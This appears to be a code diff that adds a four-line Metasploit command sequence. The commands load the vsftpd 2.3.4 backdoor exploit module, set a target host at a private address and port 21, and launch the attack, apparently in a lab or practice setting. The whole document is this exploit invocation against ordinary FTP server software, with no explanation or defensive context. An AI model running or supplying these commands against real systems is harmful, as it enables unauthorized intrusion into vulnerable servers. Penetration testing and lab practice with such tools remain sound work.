@@ -1,0 +1,4 @@
+use exploit/unix/ftp/vsftpd_234_backdoor
+			set RHOSTS 10.10.10.20
+			set RPORT 21
+			exploit
